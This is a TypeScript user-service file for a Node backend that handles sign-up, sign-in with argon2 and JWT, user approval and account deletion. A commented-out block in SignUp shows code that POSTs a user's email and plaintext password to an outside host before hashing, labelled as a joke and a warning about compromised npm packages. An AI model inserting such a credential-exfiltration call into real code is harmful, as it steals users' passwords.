import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IUserService from '../services/IServices/IUserService';
import { UserMap } from "../mappers/UserMap";
import { IUserDTO } from '../dto/IUserDTO';

import IUserRepo from './IRepos/IUserRepo';
import IRoleRepo from './IRepos/IRoleRepo';

import { User } from '../domain/user';
import { UserPassword } from '../domain/userPassword';
import { UserEmail } from '../domain/userEmail';

import { Role } from '../domain/role';

import { Result } from "../core/logic/Result";
import * as fs from 'fs';

@Service()
export default class UserService implements IUserService{
  constructor(
      @Inject(config.repos.user.name) private userRepo : IUserRepo,
      @Inject(config.repos.role.name) private roleRepo : IRoleRepo,
      @Inject('logger') private logger,
  ) {}


  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
      }



      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      

      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      let role: Role;


      const roleOrError = await this.getRoleByName(userDTO.role);
      if (roleOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(roleOrError.error);
      } else {
        role = roleOrError.getValue();
      }

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        phoneNumber: userDTO.phoneNumber,
        taxpayerNumber: userDTO.taxpayerNumber,
        email: email,
        role: role,
        password: password,
        estado: userDTO.estado,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });
      
      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO, token: string }>> {

    const user = await this.userRepo.findByEmail( email );

    if (!user) {
      throw new Error('User not registered');
    }
    if( user.estado == "pendente" || user.estado == "reprovado" ){
      throw new Error('User not active');
    }

    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(user.password.value, password);
    if (validPassword) {
      this.logger.silly('Password is valid!');
      this.logger.silly('Generating JWT');
      const token = this.generateToken(user) as string;

      const userDTO = UserMap.toDTO2( user ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTO, token: token} );
    } else {
      throw new Error('Invalid Password');
    }
  
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);

    const id = user.id.toString();
    const email = user.email.value;
    const firstName = user.firstName;
    const lastName = user.lastName;
    const role = user.role.id.value;

    return jwt.sign(
      {
        id: id,
        email: email, // We are gonna use this in the middleware 'isAuth'
        role: role,
        firstName: firstName,
        lastName: lastName,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }


  private async getRole (roleId: string): Promise<Result<Role>> {

    const role = await this.roleRepo.findByDomainId( roleId );
    const found = !!role;

    if (found) {
      return Result.ok<Role>(role);
    } else {
      return Result.fail<Role>("Couldn't find role by id=" + roleId);
    }
  }

  private async getRoleByName (roleName: string): Promise<Result<Role>> {
    const role = await this.roleRepo.findByName( roleName );
    const found = !!role;

    if (found) {
      return Result.ok<Role>(role);
    } else {
      return Result.fail<Role>("Couldn't find role by name=" + roleName);
    }
  }

  public async createUser(userDTO: IUserDTO): Promise<Result<IUserDTO>>{
    try {
      // Email validation
      const allowedDomain = config.email.allowedDomain;
      const emailDomain = userDTO.email.split('@')[1];

      if( allowedDomain != emailDomain ){
        throw new Error("Invalid Email");
      }
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
      if (found) {
        throw new Error("User already exists.");
      }
      const email = await UserEmail.create( userDTO.email ).getValue();

      // Role validation
      let role: Role;
      const roleOrError = await this.getRoleByName(userDTO.role);
      if (roleOrError.isFailure) {
        throw new Error("Role not found");
      } else {
        role = roleOrError.getValue();
      }

      // Password validation
      const passwordRegex = new RegExp("(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[@#%])(?=.{10,})");
      if( !passwordRegex.test(userDTO.password) ){
        throw new Error("Password must have at least 10 characters, 1 uppercase letter, 1 lowercase letter, 1 number and 1 symbol [@#%]");
      }
      const salt = randomBytes(32);
      //this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      //this.logger.silly('Creating user db record');
      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        phoneNumber: userDTO.phoneNumber,
        taxpayerNumber: userDTO.taxpayerNumber,
        email: email,
        role: role,
        password: password,
        estado:userDTO.estado
      });
      

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }
      const userResult = userOrError.getValue();
      //this.logger.silly('Generating JWT');
      //const token = this.generateToken(userResult);

      //this.logger.silly('Sending welcome email');
      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<IUserDTO>( userDTOResult );

    } catch (e) {
      //this.logger.error(e);
      return Result.fail<IUserDTO>(e.message);
    }
  }

  public async downloadUserData(email: string): Promise<Result<IUserDTO>>{
    try {
      const user = await this.userRepo.findByEmail(email);
      if (!user) {
        throw new Error('User not found');
      }
      
      if( user.role.name != "User" ){
        throw new Error('User is a backoffice user');
      }
      const userDTO = UserMap.toDTO(user) as IUserDTO;
      //this.logger.silly(`User data fetched for email: ${email}`);

      return Result.ok<IUserDTO>(userDTO);
    } catch (e) {
      return Result.fail<IUserDTO>(e.message);
    }
  }

  public async listAllPendingUsers(): Promise<Result<Array<IUserDTO>>>{
    try {
      const users = await this.userRepo.findAllPendingUsers();
      const userDTOs = UserMap.toDTOArray(users) as IUserDTO[];
      return Result.ok<Array<IUserDTO>>(userDTOs);
    } catch (e) {
      return Result.fail<Array<IUserDTO>>(e.message);
    }
  }

  public async approveUser(email: string): Promise<Result<IUserDTO>>{
    try {
      const user = await this.userRepo.findByEmail(email);
      if (!user) {
        throw new Error('User not found');
      }
      user.estado = "aprovado";
      await this.userRepo.save(user);
      const userDTO = UserMap.toDTO(user) as IUserDTO;

      //this.logger.silly(`User data fetched for email: ${email}`);

      return Result.ok<IUserDTO>(userDTO);
    } catch (e) {
      return Result.fail<IUserDTO>(e.message);
    }
  }

  public async disapproveUser(email: string): Promise<Result<IUserDTO>>{
    try{
      const user = await this.userRepo.findByEmail(email);
      if (!user) {
        throw new Error('User not found');
      }
      user.estado = "reprovado";
      await this.userRepo.save(user);
      const userDTO = UserMap.toDTO(user) as IUserDTO;

      //this.logger.silly(`User data fetched for email: ${email}`);

      return Result.ok<IUserDTO>(userDTO);
    }catch(e){
      return Result.fail<IUserDTO>(e.message);
    }
  }

  public async cancelAccount(email: string): Promise<boolean>{
    try{
      await this.userRepo.deleteUser(email);
      return true;
    }catch(e){
      return false;
    }
  }
}



